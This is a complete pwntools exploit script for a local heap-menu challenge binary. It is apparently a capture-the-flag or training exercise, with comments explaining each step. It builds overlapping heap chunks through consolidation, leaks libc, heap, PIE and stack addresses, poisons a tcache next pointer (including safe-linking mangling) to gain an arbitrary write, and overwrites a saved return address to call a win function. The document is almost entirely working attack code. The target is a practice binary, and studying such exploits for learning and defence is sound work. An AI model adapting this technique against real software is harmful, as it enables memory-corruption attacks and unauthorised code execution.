from pwn import *

STACK_CHOICE = 0xd3
PIE_CHOICE = 0x83

target = process("./chall-01")
gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

# Our I/O Wrapper Functions
def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"1")
	target.recvuntil(b"Enter the chunk size between 0x0-0xff0:\n")
	target.sendline(bytes(str(chunk_size), "utf-8"))
	target.recvuntil(b"Which chunk spot would you like to allocate?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def view_chunk(chunk_idx: int) -> bytes:
	target.recvuntil(MENU_STRING)
	target.sendline(b"2")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Chunk Contents: ")
	contents = target.recvuntil(b"\x0d\x0a")
	return contents[:-2]

def edit_chunk(chunk_idx: int, chunk_size: int, chunk_contents: bytes) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"3")
	target.recvuntil(b"Enter the write size between 0x0-0xff0:\n")
	target.sendline(bytes(str(chunk_size), "utf-8"))
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Please input new chunk content:\n")
	target.sendline(chunk_contents)

def free_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"4")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret(chunk_idx: int, choice: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"5")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Choice?\n")
	target.sendline(bytes(str(choice), "utf-8"))

# First off, a brief explannation of what we are going to do.
# First we will have a heap consolidation, to get overlapping chunks
# This will give us our libc and heap infoleaks.
# After that, we will overwrite a tcache next ptr, to get a ptr
# allocated to chunks. Then we will leverage that into an arbirtary write
# which we will then use to overwrite a saved stack return address

# Allocate our starting chunks
allocate_new_chunk(0x20, 0) # We will use this to overwrite chunk 1's header
allocate_new_chunk(0x500, 1) # We will consolidate into this chunk
allocate_new_chunk(0x80, 2) # This chunk we will allocate twice via consolidation
allocate_new_chunk(0x500, 3) # We will overwrite this chunk's header for consolidation
allocate_new_chunk(0x80, 4) # Chunk to prevent consolidation
allocate_new_chunk(0x500, 5) # We will use this chunk for heap infoleak
allocate_new_chunk(0x80, 6) # Chunk to prevent consolidation

# So our first step, is to allocate overlapping chunks via consolidation
# We will allocate a second chunk, where chunk `2` is
# We will overwrite chunk 3's header, to free it to consolidate into chunk 1

# Start off via freeing chunk 1
free_chunk(1)

# Expand the size of chunk 1, via an overflow from chunk 0
edit_chunk(0, 0x30, b"1"*0x20 + p64(0x00) + p64(0x5a0))

# Overwrite chunk 3's header, to match the expanded size
edit_chunk(2, 0x90, b"0"*0x80 + p64(0x5a0) + p64(0x510))

# Free chunk 3, cause it to consolidate into chunk 2
free_chunk(3)

# Break off a large enough chunk from the consolidated chunk,
# So that the remainder directly overlaps with chunk 2
allocate_new_chunk(0x500, 1)

# The reallocated chunk, if not cleared out, will start
# with a libc bin from it's time (and position) in the main_arena bins
# get the libc infoleak
libc_leak = view_chunk(1)
libc_leak_val = u64(libc_leak + b"\x00"*2)

# Calculate the base of libc
libc_base = libc_leak_val - 0x22d290

# Now that we have a libc infoleak, let's next up get a heap infoleak.
# To do this, we will simply insert another chunk into the unsorted bin, along
# with our consoldiated chunk that overlaps with chunk 2
# this will put a heap ptr within our reach
free_chunk(5)

# Now, a heap ptr should be at offset `0x08` from the start of chunk 2
# We will write a string that leads up to it, so we can leak it
# because the print happens with '%s' it ends when it reaches a null byte
edit_chunk(2, 0x8, b"0"*8)

# Get the heap infoleak
heap_leak = view_chunk(2)

# Parse out the leak, calculate the base of the heap
heap_leak = heap_leak[8:]
heap_leak_val = u64(heap_leak + b"\x00"*2)

heap_base = heap_leak_val - 0x2220

# Now, we overwrote an important ptr of chunk2, which is in the unsorted bin
# We will need to fix this, before it gets removed from the unsorted bin
# otherwise it will crash

# Calculate what the ptr should be
libc_fix_val = libc_base + 0x22cd00

# Fix the ptr
edit_chunk(2, 0x8, p64(libc_fix_val))

# Allocate a ptr that overlaps directly with chunk 2
# This will be used to overflow into a freed tcache chunk
# To overwrite it's next ptr
allocate_new_chunk(0x20, 5)

# And three more `0x80` sized chunks
# These will be inserted into the same tcache bin
allocate_new_chunk(0x80, 7)
allocate_new_chunk(0x80, 8)
allocate_new_chunk(0x80, 9)

# Use the secret functionallity, to get PIE/Stack infoleaks
secret(8, PIE_CHOICE)
pie_leak = view_chunk(8)
pie_leak_val = u64(pie_leak + b"\x00"*2)
pie_base = pie_leak_val - 0x1711

secret(8, STACK_CHOICE)
stack_leak = view_chunk(8)
stack_leak_val = u64(stack_leak + b"\x00"*2)
target_stack_val = stack_leak_val + 0x38

# Insert the three chunks into the same tcache bin
# Chunk 7 being the head
free_chunk(9)
free_chunk(8)
free_chunk(7)

# Calculate the last needed values
win_func = pie_base + 0x12db
tcache_chunk = heap_base + 0x2260
mangled_next = ((tcache_chunk >> 12) ^ (pie_base + 0x4040))

print("libc base: " + hex(libc_base))
print("heap base: " + hex(heap_base))
print("pie base: " + hex(pie_base))
print("stack ret address: " + hex(target_stack_val))

# We will be overwriting the next ptr of chunk 7 via an
# overflow from chunk 5. Form the payload to do that
payload = b"0"*0x20 + p64(0x00) + p64(0x91) + p64(mangled_next)

# Execute the overflow, to overwrite the next ptr
edit_chunk(5, len(payload), payload)

# Allocate chunk 7, make the next head our chunk
allocate_new_chunk(0x80, 9)

# Allocate a ptr to `chunks`
allocate_new_chunk(0x80, 8)

# Overwrite the first ptr of `chunks` with a ptr
# to where the return address of `edit_chunks` is stored
edit_chunk(8, 8, p64(target_stack_val))

# Overwrite the saved stack return address of chunks
# with a ptr to the win func, which then get's called
# since the write happens within the same function
edit_chunk(0, 8, p64(win_func))

# Drop to an interactive shell
target.interactive()
